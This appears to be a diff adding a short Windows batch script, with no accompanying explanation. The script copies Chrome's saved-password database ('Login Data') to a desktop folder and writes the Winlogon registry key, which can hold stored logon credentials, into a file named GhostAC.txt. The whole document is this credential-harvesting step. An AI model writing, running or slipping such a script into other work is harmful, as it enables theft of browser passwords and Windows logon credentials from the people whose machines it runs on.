@@ -1,0 +1,5 @@
+@echo off
+xcopy "%LocalAppData%\Google\Chrome\User Data\Default\login Data" /h /c C:\Users\tyuiti\Desktop 
+
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" > GhostAC.txt 
+pause
